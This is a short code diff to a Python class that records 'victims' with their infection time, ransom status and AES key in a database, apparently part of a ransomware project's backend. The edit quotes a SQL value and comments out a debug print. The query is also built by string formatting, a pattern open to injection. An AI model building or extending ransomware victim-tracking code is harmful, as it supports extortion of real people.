@@ -19,7 +19,7 @@ class victims:
                          AESKEY     VARCHAR(100)    NOT NULL)""")
         db.commit()
         cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, AESKEY) 
-                                VALUES ('{i}', '{t}', FALSE, '123')""".format(
+                                VALUES ('{i}', '{t}', 'FALSE', '123')""".format(
                                     i=uuid.uuid1().hex,t=time.ctime()))
         db.commit()
         db.close()
@@ -37,7 +37,7 @@ class victims:
                 'inf_time': i[1], 
                 'ransom': bool(i[2]),
                 'AES_key': i[3]})
-        print(self.vicList[0]['id'])
+        # print(self.vicList[0]['id'])
         db.close()
 
     def new_victim(self, vid, pkey):
